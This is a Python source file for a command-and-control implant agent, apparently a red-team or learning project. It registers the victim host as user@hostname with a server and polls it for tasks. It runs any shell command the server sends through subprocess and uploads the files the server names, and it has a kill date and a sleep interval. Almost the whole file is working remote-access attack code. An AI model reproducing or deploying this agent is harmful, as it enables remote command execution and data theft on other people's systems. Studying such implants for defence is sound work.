import getpass
import socket
import json
import requests
import base64
import datetime
import subprocess
import time
# TODO basic error checking

# variables that should be changed
# date in yyyy/mm/dd format
killdate= datetime.datetime(2021,12,14)
ServerUrl="http://localhost:8000/"
sleep_interval=10

def checkDate(aKilldate):
    if(datetime.datetime.now() > aKilldate):
        exit()
# accepts a string name and uses to to 
def register(aName):
    data = {"name" : aName}
    data_json = json.dumps(data)
    headers = {'Content-type': 'application/json'}
    try:
        response = requests.post(ServerUrl+"api/register/", data=data_json, headers=headers)
    except requests.exceptions.ConnectionError:
        return -1
    if response.status_code ==201:
        return response.json()['id']
    else:
        return -1
def get_command(aId):
    response= requests.get(ServerUrl+"api/checkin/"+str(aId)+"/")
    if response.status_code==200:
        return response.json()
    else:
        return '{}'

    #print(response.content)
    return response.json()
def execute_command(data):
    if data['CommandType']=='FileTransfer':
        if data['TransferLog']['direction']=='Download':
            path=data['TransferLog']['Path']
            log_id = data['id']
            filename = data['TransferLog']['FileName']
            Upload_file(log_id,filename,path)
            return "Sucess"
        if data['TransferLog']['direction']=='Upload':
            print("upload")
        #print("file transfer")
    if data['CommandType']=='ShellCommand':
        return subprocess.check_output(data['Command'].split(' '))

def download_file(command_id,filename):
    response= requests.get(ServerUrl+"api/AgentDownload/"+str(command_id)+"/")
    #filename=data['TransferLog']['FileName']
    with open(str(filename),"wb") as file:
        for chunk in response.iter_content(chunk_size=1024):
            if chunk:
                file.write(chunk)
def Upload_file(file_id,afile,path):
    files ={'file': open(str(path)+str(afile),'rb')}
    response= requests.post(ServerUrl+"api/upload/"+str(file_id)+"/",files=files)
def report_output(output,command_id):
    data={'output':output,'id': command_id }
    requests.post(ServerUrl+"api/agentreportoutput/",data=data)
# main method
#has_registered=False

agent_id = -1
#derive agent name
AgentName= getpass.getuser()+"@" + socket.gethostname()
# getting registered 
while(agent_id<0):
    checkDate(killdate)
    agent_id= register(AgentName)
    print(agent_id)
    time.sleep(sleep_interval)
# query for commands
while(True):
    checkDate(killdate)
    data=get_command(agent_id)
    if data !='{}':
        output=execute_command(data)
        print(output)
        report_output(output,data['id'])
    time.sleep(sleep_interval)







#agent_id=register(AgentName)
#print(agent_id)

# #print( register(AgentName))
# json_data= get_command(agent_id)
# output=execute_command(json_data)
# print(output)
# print(json_data['id'])
# report_output(output,json_data['id'])
#download_file(2,"filenmae.txt")


# this is when we register
#response = requests.get("https://192.168.150.111/api/v1/vmware/vm?name="+vmname, auth=auth_values, verify=False)
# data = {"name" : AgentName}
# data_json = json.dumps(data)
# headers = {'Content-type': 'application/json'}
# # response = requests.post(ServerUrl+"api/register/", data=data_json, headers=headers)
# print(response.json())
